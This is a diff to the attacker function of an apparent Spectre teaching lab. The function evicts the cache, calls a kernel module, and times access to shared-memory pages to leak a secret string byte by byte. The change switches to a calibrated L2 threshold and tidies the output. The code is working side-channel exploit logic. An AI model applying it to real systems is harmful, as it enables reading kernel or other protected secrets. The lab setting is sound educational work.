@@ -43,8 +43,7 @@ int run_attacker(int kernel_fd, char *shared_memory)
 {
     char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
     size_t current_offset = 0;
-    warmup();
-    CacheStats cache_stats = record_cache_stats();
+    CacheStats cache_stats = generate_cache_stats(1000);
     printf("Launching attacker\n");
     
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++)
@@ -56,22 +55,17 @@ int run_attacker(int kernel_fd, char *shared_memory)
             for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) 
             {
                 void* target_addr = shared_memory + i * SHD_SPECTRE_LAB_PAGE_SIZE;
-                REPEAT(2) evict_all_cache();
+                evict_all_cache();
                 call_kernel_part1(kernel_fd, shared_memory, current_offset);
-                uint32_t time = time_access(target_addr);
-                //MemoryLevel level = determine_memory_level(cache_stats, target_addr);
-                //if (i == 0 || (isprint((char)i) && !isspace((char)i))) {
-                  //  printf("Found character \'%c\', with time: %u\n", (char)i, time);
-                    //printf("Found character \'%c\', at level: %s\n", (char)i, memory_level_to_str(level));
-                //}
-                if (time < 100){//level != DRAM) {
+                uint64_t time = time_access(target_addr);
+                if (time <= cache_stats.l2 + 20 /*Plus some padding*/) {
                     leaked_byte = (char)i;
                     found = true;
                     break;
                 }
             }
         }
-        printf("Found char:%c:\n", leaked_byte);
+        printf("[Part 1] Found char:%c:\n", leaked_byte);
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
             break;
@@ -79,6 +73,7 @@ int run_attacker(int kernel_fd, char *shared_memory)
     }
 
     printf("\n\n[Part 1] We leaked:\n%s\n", leaked_str);
+    destroy_cache_stats(cache_stats);
     close(kernel_fd);
     return EXIT_SUCCESS;
 }
